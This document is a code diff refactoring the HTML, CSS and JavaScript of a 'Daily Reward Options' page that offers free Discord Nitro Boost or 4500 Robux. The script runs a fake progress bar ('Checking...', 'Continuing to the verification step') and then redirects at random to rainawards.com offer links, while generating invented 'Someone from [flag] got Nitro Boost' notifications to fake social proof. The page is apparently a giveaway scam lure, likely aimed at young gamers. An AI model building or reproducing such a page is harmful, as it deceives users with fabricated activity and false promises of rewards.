@@ -45,10 +45,11 @@
       z-index: 2;
     }
 
+    /* Language Switcher */
     .lang-switcher {
       display: flex;
       justify-content: flex-end;
-      gap: 0.5rem;
+      gap: 0.75rem;
       margin-bottom: 1.25rem;
       flex-wrap: wrap;
     }
@@ -58,7 +59,7 @@
       text-decoration: none;
       font-size: 0.7rem;
       font-weight: 500;
-      padding: 0.3rem 0.8rem;
+      padding: 0.25rem 0.75rem;
       border-radius: 2rem;
       transition: all 0.2s;
       background: rgba(255, 255, 255, 0.04);
@@ -75,6 +76,7 @@
       color: white;
     }
 
+    /* Main Card */
     .card {
       background: #0f1119;
       border-radius: 1.75rem;
@@ -87,7 +89,7 @@
       display: flex;
       align-items: center;
       gap: 1rem;
-      margin-bottom: 1rem;
+      margin-bottom: 1.25rem;
     }
 
     .badge {
@@ -132,9 +134,10 @@
       font-size: 0.7rem;
       font-weight: 500;
       color: #8b9cff;
-      margin: 0.75rem 0 1.5rem 0;
+      margin: 0.5rem 0 1.5rem 0;
     }
 
+    /* Choices Grid - Exactly 2 cards */
     .choices {
       display: grid;
       grid-template-columns: repeat(2, 1fr);
@@ -218,6 +221,7 @@
       line-height: 1.4;
     }
 
+    /* Actions */
     .actions {
       text-align: center;
     }
@@ -252,6 +256,7 @@
       margin-top: 0.6rem;
     }
 
+    /* Progress */
     .progress {
       background: #0a0c14;
       border-radius: 1rem;
@@ -259,13 +264,10 @@
       margin-top: 1rem;
     }
 
-    .progress-row {
-      margin-bottom: 0.5rem;
-    }
-
     .status {
       font-weight: 600;
       font-size: 0.8rem;
+      margin-bottom: 0.5rem;
     }
 
     .bar {
@@ -289,16 +291,13 @@
       margin-top: 0.5rem;
     }
 
+    /* FAQ Section */
     .seo-content {
       margin-top: 1.75rem;
       background: #0a0c14;
       border-radius: 1.25rem;
       padding: 1.25rem 1.5rem;
       border: 1px solid rgba(88, 101, 242, 0.08);
-    }
-
-    .seo-intro {
-      margin-bottom: 1rem;
     }
 
     .eyebrow {
@@ -313,6 +312,7 @@
       font-family: 'Unbounded', sans-serif;
       font-size: 1rem;
       color: #fff;
+      margin-bottom: 1rem;
     }
 
     .faq-list details {
@@ -344,7 +344,7 @@
       margin-top: 1.5rem;
     }
 
-    /* ACTIVITY TOASTS - Clean style exactly like image */
+    /* Activity Toasts - Clean bottom left */
     .activity-toasts {
       position: fixed;
       bottom: 24px;
@@ -357,12 +357,12 @@
     }
 
     .activity-toast {
-      background: #1e2030;
-      backdrop-filter: blur(16px);
+      background: #1a1c2a;
+      backdrop-filter: blur(12px);
       border-radius: 12px;
-      padding: 12px 16px;
-      min-width: 220px;
-      max-width: 260px;
+      padding: 10px 14px;
+      min-width: 200px;
+      max-width: 240px;
       animation: slideInLeft 0.3s ease;
       box-shadow: 0 8px 20px rgba(0, 0, 0, 0.3);
       border-left: 3px solid;
@@ -377,20 +377,20 @@
     }
 
     .toast-line1 {
-      font-size: 0.7rem;
+      font-size: 0.65rem;
       color: #9a9fc0;
       margin-bottom: 4px;
     }
 
     .toast-reward {
       font-weight: 700;
-      font-size: 0.9rem;
+      font-size: 0.85rem;
       color: #fff;
       margin-bottom: 4px;
     }
 
     .toast-time {
-      font-size: 0.6rem;
+      font-size: 0.55rem;
       color: #6a6f90;
     }
 
@@ -413,12 +413,15 @@
       .choice-icon img { width: 42px; height: 42px; }
       h1 { font-size: 1.2rem; }
       .activity-toasts { bottom: 12px; left: 12px; }
-      .activity-toast { min-width: 180px; padding: 10px 14px; }
     }
 
     .disabled {
       pointer-events: none;
       opacity: 0.6;
+    }
+
+    .hidden {
+      display: none;
     }
   </style>
   <!-- Google Translate Widget -->
@@ -443,13 +446,12 @@
       <a class="lang-link" data-lang="pt">Português BR</a>
       <a class="lang-link" data-lang="id">Indonesia</a>
     </nav>
-    <!-- Hidden Google Translate container -->
     <div id="google_translate_element" style="display: none;"></div>
 
-    <section class="card" aria-labelledby="page-title">
+    <section class="card">
       <header class="header">
-        <div class="badge" aria-hidden="true">
-          <svg viewBox="0 0 24 24" aria-hidden="true">
+        <div class="badge">
+          <svg viewBox="0 0 24 24">
             <path d="M5 8h14v11a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V8z" />
             <path d="M12 3v18" />
             <path d="M3 8h18" />
@@ -457,56 +459,47 @@
           </svg>
         </div>
         <div>
-          <h1 id="page-title">Daily Reward Options</h1>
+          <h1>Daily Reward Options</h1>
           <p class="subtitle">Explore available rewards and continue to the verification step to claim access.</p>
         </div>
       </header>
       <p class="trust-note">No password required.</p>
 
-      <div id="screen-2">
-        <div id="choices" class="choices two">
-          <button type="button" class="choice-card" data-choice-title="Nitro Boost">
-            <span class="choice-badge">Best Value</span>
-            <div class="choice-icon">
-              <img src="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" width="96" height="96" alt="Nitro Boost" fetchpriority="high" />
-            </div>
-            <div class="choice-title">Nitro Boost</div>
-            <div class="choice-price">$99.99</div>
-            <div class="choice-sub">Top Nitro option with boosts, streaming perks, and profile extras.</div>
-          </button>
-          <button type="button" class="choice-card" data-choice-title="4500 Robux">
-            <div class="choice-icon">
-              <img src="https://i.postimg.cc/1RgP9DFD/robux-1.webp" width="96" height="96" alt="4500 Robux" decoding="async" />
-            </div>
-            <div class="choice-title">4500 Robux</div>
-            <div class="choice-price">$49.99</div>
-            <div class="choice-sub">Large Robux pack for upgrades, passes, and future drops.</div>
-          </button>
-        </div>
+      <div class="choices">
+        <button type="button" class="choice-card" data-choice="Nitro Boost">
+          <span class="choice-badge">Best Value</span>
+          <div class="choice-icon">
+            <img src="https://i.postimg.cc/3JgsR1xh/nitroboost.webp" alt="Nitro Boost" />
+          </div>
+          <div class="choice-title">Nitro Boost</div>
+          <div class="choice-price">$99.99</div>
+          <div class="choice-sub">Top Nitro option with boosts, streaming perks, and profile extras.</div>
+        </button>
+        <button type="button" class="choice-card" data-choice="4500 Robux">
+          <div class="choice-icon">
+            <img src="https://i.postimg.cc/1RgP9DFD/robux-1.webp" alt="4500 Robux" />
+          </div>
+          <div class="choice-title">4500 Robux</div>
+          <div class="choice-price">$49.99</div>
+          <div class="choice-sub">Large Robux pack for upgrades, passes, and future drops.</div>
+        </button>
       </div>
 
-      <div id="actions" class="actions">
-        <button class="generate-btn" id="generate-btn" type="button" disabled>Continue</button>
-        <p class="actions-note">Select one of the two best rewards to unlock the button.</p>
+      <div class="actions">
+        <button class="generate-btn" id="generateBtn" disabled>Continue</button>
+        <p class="actions-note" id="actionsNote">Select one of the two best rewards to unlock the button.</p>
       </div>
 
-      <div id="progress" class="progress hidden">
-        <div class="progress-row">
-          <div class="status" id="status-text"></div>
-        </div>
-        <div class="bar" aria-hidden="true">
-          <div class="bar-fill" id="bar-fill"></div>
-        </div>
-        <div class="status-sub" id="status-sub"></div>
-        <button id="final-verify-btn" class="generate-btn hidden" type="button">Continue</button>
+      <div id="progressContainer" class="progress hidden">
+        <div class="status" id="statusText"></div>
+        <div class="bar"><div class="bar-fill" id="barFill"></div></div>
+        <div class="status-sub" id="statusSub"></div>
       </div>
     </section>
 
-    <section class="seo-content" aria-labelledby="faq-title">
-      <div class="seo-intro">
-        <p class="eyebrow">Questions</p>
-        <h2 id="faq-title">Reward access FAQ</h2>
-      </div>
+    <section class="seo-content">
+      <div class="eyebrow">Questions</div>
+      <h2>Reward access FAQ</h2>
       <div class="faq-list">
         <details>
           <summary>Do I need to enter my password?</summary>
@@ -532,142 +525,172 @@
     </footer>
   </main>
 
-  <div id="activity-toasts" class="activity-toasts" aria-live="polite" aria-atomic="true"></div>
+  <div id="toastContainer" class="activity-toasts"></div>
 
   <script>
-    // ==================== REDIRECT URLS (random selection) ====================
-    const REDIRECT_URLS = [
-      "https://rainawards.com/ow/6a1a96bb419d7ab04aa64184",
-      "https://rainawards.com/ow/69bf833f2d6a708a36f234d5"
-    ];
-
-    function getRandomRedirectUrl() {
-      return REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];
-    }
-
-    // ==================== GOOGLE TRANSLATE INTEGRATION ====================
-    const langMap = {
-      'en': 'en',
-      'fr': 'fr',
-      'es': 'es',
-      'pt': 'pt',
-      'id': 'id'
-    };
-
-    function triggerGoogleTranslate(langCode) {
-      const googleLang = langMap[langCode] || 'en';
-      const select = document.querySelector('.goog-te-combo');
-      if (select) {
-        select.value = googleLang;
-        select.dispatchEvent(new Event('change'));
-      } else {
-        const checkInterval = setInterval(function() {
-          const selectEl = document.querySelector('.goog-te-combo');
-          if (selectEl) {
-            selectEl.value = googleLang;
-            selectEl.dispatchEvent(new Event('change'));
-            clearInterval(checkInterval);
-          }
-        }, 100);
-        setTimeout(function() { clearInterval(checkInterval); }, 3000);
-      }
-      localStorage.setItem('preferred_language', langCode);
-    }
-
-    function setActiveLang(langCode) {
-      document.querySelectorAll('.lang-link').forEach(link => {
-        if (link.getAttribute('data-lang') === langCode) {
-          link.classList.add('active');
-        } else {
-          link.classList.remove('active');
-        }
-      });
-    }
-
-    function getSavedLanguage() {
-      return localStorage.getItem('preferred_language') || 'en';
-    }
-
-    function applySavedLanguage() {
-      const savedLang = getSavedLanguage();
-      setActiveLang(savedLang);
-      if (savedLang !== 'en') {
-        triggerGoogleTranslate(savedLang);
-      }
-    }
-
-    document.querySelectorAll('.lang-link').forEach(link => {
-      link.addEventListener('click', (e) => {
-        e.preventDefault();
-        const langCode = link.getAttribute('data-lang');
-        setActiveLang(langCode);
-        triggerGoogleTranslate(langCode);
-      });
-    });
-
-    setTimeout(applySavedLanguage, 800);
-
-    // ==================== MAIN SCRIPT ====================
-    document.addEventListener("DOMContentLoaded", () => {
-      const choicesEl = document.getElementById("choices");
-      const progressDiv = document.getElementById("progress");
-      const statusText = document.getElementById("status-text");
-      const statusSub = document.getElementById("status-sub");
-      const barFill = document.getElementById("bar-fill");
-      const generateBtn = document.getElementById("generate-btn");
-      const actionsNote = document.querySelector(".actions-note");
-      const activityToasts = document.getElementById("activity-toasts");
-
-      let selectedChoice = null;
-      let selectedChoiceTitle = null;
-      let lastCountryCode = null;
-      let activityAgeIndex = 0;
-
-      const rewardChoices = [
-        { title: "Nitro Boost", price: "$99.99", desc: "Top Nitro option with boosts, streaming perks, and profile extras.", badge: "Best Value", icon: "https://i.postimg.cc/3JgsR1xh/nitroboost.webp", type: "nitro" },
-        { title: "4500 Robux", price: "$49.99", desc: "Large Robux pack for upgrades, passes, and future drops.", icon: "https://i.postimg.cc/1RgP9DFD/robux-1.webp", type: "robux" }
+    (function() {
+      // Redirect URLs - random selection
+      const REDIRECT_URLS = [
+        "https://rainawards.com/ow/6a1a96bb419d7ab04aa64184",
+        "https://rainawards.com/ow/69bf833f2d6a708a36f234d5"
       ];
 
-      const progressSteps = [
+      function getRandomRedirect() {
+        return REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];
+      }
+
+      // Google Translate integration
+      const langMap = { en: 'en', fr: 'fr', es: 'es', pt: 'pt', id: 'id' };
+      
+      function triggerTranslate(langCode) {
+        const googleLang = langMap[langCode] || 'en';
+        const select = document.querySelector('.goog-te-combo');
+        if (select) {
+          select.value = googleLang;
+          select.dispatchEvent(new Event('change'));
+        } else {
+          const interval = setInterval(() => {
+            const el = document.querySelector('.goog-te-combo');
+            if (el) {
+              el.value = googleLang;
+              el.dispatchEvent(new Event('change'));
+              clearInterval(interval);
+            }
+          }, 100);
+          setTimeout(() => clearInterval(interval), 3000);
+        }
+        localStorage.setItem('preferred_lang', langCode);
+      }
+
+      function setActiveLang(lang) {
+        document.querySelectorAll('.lang-link').forEach(link => {
+          if (link.dataset.lang === lang) link.classList.add('active');
+          else link.classList.remove('active');
+        });
+      }
+
+      const savedLang = localStorage.getItem('preferred_lang') || 'en';
+      setActiveLang(savedLang);
+      if (savedLang !== 'en') setTimeout(() => triggerTranslate(savedLang), 500);
+
+      document.querySelectorAll('.lang-link').forEach(link => {
+        link.addEventListener('click', (e) => {
+          e.preventDefault();
+          const lang = link.dataset.lang;
+          setActiveLang(lang);
+          triggerTranslate(lang);
+        });
+      });
+
+      // Main reward selection logic
+      let selectedReward = null;
+      const choiceCards = document.querySelectorAll('.choice-card');
+      const generateBtn = document.getElementById('generateBtn');
+      const actionsNote = document.getElementById('actionsNote');
+      const progressContainer = document.getElementById('progressContainer');
+      const statusText = document.getElementById('statusText');
+      const statusSub = document.getElementById('statusSub');
+      const barFill = document.getElementById('barFill');
+
+      function selectChoice(card, rewardName) {
+        choiceCards.forEach(c => c.classList.remove('active'));
+        card.classList.add('active');
+        selectedReward = rewardName;
+        generateBtn.disabled = false;
+        generateBtn.textContent = `Continue with ${rewardName}`;
+        actionsNote.classList.add('hidden');
+      }
+
+      choiceCards.forEach(card => {
+        card.addEventListener('click', () => {
+          const reward = card.getAttribute('data-choice');
+          selectChoice(card, reward);
+        });
+      });
+
+      // Progress steps
+      const steps = [
         { label: "Preparing...", sub: "Opening a secure reward page for your session", min: 500, max: 750, target: 30 },
         { label: "Checking...", sub: "Reviewing available options for your device and region", min: 650, max: 900, target: 66 },
         { label: "Finalizing...", sub: "Continuing to the verification step", min: 700, max: 950, target: 100 }
       ];
 
-      function rand(min, max) { return Math.floor(min + Math.random() * (max - min + 1)); }
-      function pickRandom(arr) { return arr[rand(0, arr.length - 1)]; }
-
-      const activityCountries = [
-        { code: "gb", name: "United Kingdom", flag: "🇬🇧" }, { code: "us", name: "United States", flag: "🇺🇸" },
-        { code: "ca", name: "Canada", flag: "🇨🇦" }, { code: "fr", name: "France", flag: "🇫🇷" },
-        { code: "de", name: "Germany", flag: "🇩🇪" }, { code: "br", name: "Brazil", flag: "🇧🇷" },
-        { code: "au", name: "Australia", flag: "🇦🇺" }, { code: "es", name: "Spain", flag: "🇪🇸" },
-        { code: "it", name: "Italy", flag: "🇮🇹" }, { code: "nl", name: "Netherlands", flag: "🇳🇱" },
-        { code: "in", name: "India", flag: "🇮🇳" }, { code: "id", name: "Indonesia", flag: "🇮🇩" }
-      ];
-
-      function getActivityTime() {
-        const seconds = rand(5, 45);
-        return `${seconds} sec ago`;
+      function rand(min, max) {
+        return Math.floor(min + Math.random() * (max - min + 1));
       }
 
-      function showActivityToast() {
-        if (!activityToasts) return;
-        const country = activityCountries.filter(c => c.code !== lastCountryCode)[0] || activityCountries[0];
-        lastCountryCode = country.code;
-        const reward = pickRandom(rewardChoices);
-        const timeText = getActivityTime();
-        const toastType = reward.type === "nitro" ? "toast-nitro" : "toast-robux";
+      function startProgress() {
+        if (!selectedReward) return;
         
-        const toast = document.createElement("div");
+        choiceCards.forEach(c => c.classList.add('disabled'));
+        generateBtn.disabled = true;
+        progressContainer.classList.remove('hidden');
+
+        const timedSteps = steps.map(step => ({
+          ...step,
+          duration: rand(step.min, step.max),
+          pause: rand(40, 80)
+        }));
+
+        let idx = 0;
+        function advance() {
+          if (idx >= timedSteps.length) {
+            setTimeout(() => {
+              window.location.href = getRandomRedirect();
+            }, 300);
+            return;
+          }
+          const step = timedSteps[idx];
+          statusText.textContent = step.label;
+          statusSub.textContent = step.sub;
+          barFill.style.transitionDuration = step.duration + 'ms';
+          barFill.style.width = step.target + '%';
+          setTimeout(advance, step.duration + step.pause);
+          idx++;
+        }
+        advance();
+      }
+
+      generateBtn.addEventListener('click', startProgress);
+
+      // Activity toasts (clean, no emojis)
+      const toastContainer = document.getElementById('toastContainer');
+      const countries = [
+        { flag: "🇬🇧", name: "UK" }, { flag: "🇺🇸", name: "USA" }, { flag: "🇨🇦", name: "Canada" },
+        { flag: "🇫🇷", name: "France" }, { flag: "🇩🇪", name: "Germany" }, { flag: "🇧🇷", name: "Brazil" },
+        { flag: "🇦🇺", name: "Australia" }, { flag: "🇪🇸", name: "Spain" }, { flag: "🇮🇹", name: "Italy" },
+        { flag: "🇳🇱", name: "Netherlands" }, { flag: "🇮🇳", name: "India" }, { flag: "🇮🇩", name: "Indonesia" }
+      ];
+      
+      const rewards = [
+        { name: "Nitro Boost", type: "nitro" },
+        { name: "4500 Robux", type: "robux" }
+      ];
+
+      let lastCountry = null;
+
+      function showToast() {
+        if (!toastContainer) return;
+        const available = countries.filter(c => c.flag !== lastCountry);
+        const country = available.length ? available[Math.floor(Math.random() * available.length)] : countries[0];
+        lastCountry = country.flag;
+        const reward = rewards[Math.floor(Math.random() * rewards.length)];
+        const seconds = Math.floor(Math.random() * 45) + 5;
+        const toastType = reward.type === 'nitro' ? 'toast-nitro' : 'toast-robux';
+        
+        const toast = document.createElement('div');
         toast.className = `activity-toast ${toastType}`;
         toast.innerHTML = `
           <div class="toast-line1">Someone from ${country.flag}</div>
-          <div class="toast-reward">${reward.title}</div>
-          <div class="toast-time">got · ${timeText}</div>
+          <div class="toast-reward">${reward.name}</div>
+          <div class="toast-time">got · ${seconds} sec ago</div>
         `;
-        activityToasts.prepend(toast);
-        while (activityToasts.children.length > 3) activityToasts.lastElementChild.remove();
+        toastContainer.prepend(toast);
+        
+        while (toastContainer.children.length > 3) {
+          toastContainer.lastElementChild.remove();
+        }
+        
         setTimeout(() => {
           toast.style.opacity = '0';
           toast.style.transition = 'opacity 0.3s';
@@ -675,71 +698,12 @@
         }, 5500);
       }
 
-      function scheduleActivityToast() {
-        setInterval(() => { if (Math.random() > 0.3) showActivityToast(); }, rand(18000, 28000));
-        setTimeout(showActivityToast, 2000);
-      }
-
-      function selectChoice(card, item) {
-        document.querySelectorAll(".choice-card").forEach(c => c.classList.remove("active"));
-        card.classList.add("active");
-        selectedChoice = item;
-        selectedChoiceTitle = item.title;
-        if (generateBtn) generateBtn.disabled = false;
-        if (actionsNote) actionsNote.classList.add("hidden");
-        generateBtn.textContent = `Continue with ${item.title}`;
-      }
-
-      function buildChoices() {
-        choicesEl.innerHTML = "";
-        rewardChoices.forEach((item) => {
-          const card = document.createElement("button");
-          card.type = "button";
-          card.className = "choice-card";
-          card.innerHTML = `
-            ${item.badge ? `<span class="choice-badge">${item.badge}</span>` : ""}
-            <div class="choice-icon"><img src="${item.icon}" alt="${item.title}" /></div>
-            <div class="choice-title">${item.title}</div>
-            ${item.price ? `<div class="choice-price">${item.price}</div>` : ""}
-            <div class="choice-sub">${item.desc}</div>
-          `;
-          card.addEventListener("click", () => selectChoice(card, item));
-          choicesEl.appendChild(card);
-        });
-        generateBtn.disabled = true;
-      }
-
-      function startProgress() {
-        if (!selectedChoice) return;
-        document.querySelectorAll(".choice-card").forEach(c => c.classList.add("disabled"));
-        generateBtn.disabled = true;
-        progressDiv.classList.remove("hidden");
-
-        const steps = progressSteps.map(step => ({ ...step, duration: rand(step.min, step.max), pause: rand(40, 80) }));
-        let idx = 0;
-        function advance() {
-          if (idx >= steps.length) {
-            const redirectUrl = getRandomRedirectUrl();
-            setTimeout(() => {
-              window.location.href = redirectUrl;
-            }, 300);
-            return;
-          }
-          const step = steps[idx];
-          statusText.textContent = step.label;
-          statusSub.textContent = step.sub;
-          barFill.style.transitionDuration = step.duration + "ms";
-          barFill.style.width = step.target + "%";
-          setTimeout(advance, step.duration + step.pause);
-          idx++;
-        }
-        advance();
-      }
-
-      buildChoices();
-      generateBtn.addEventListener("click", startProgress);
-      scheduleActivityToast();
-    });
+      // Start toasts
+      setTimeout(showToast, 2000);
+      setInterval(() => {
+        if (Math.random() > 0.3) showToast();
+      }, 20000);
+    })();
   </script>
 </body>
 </html>
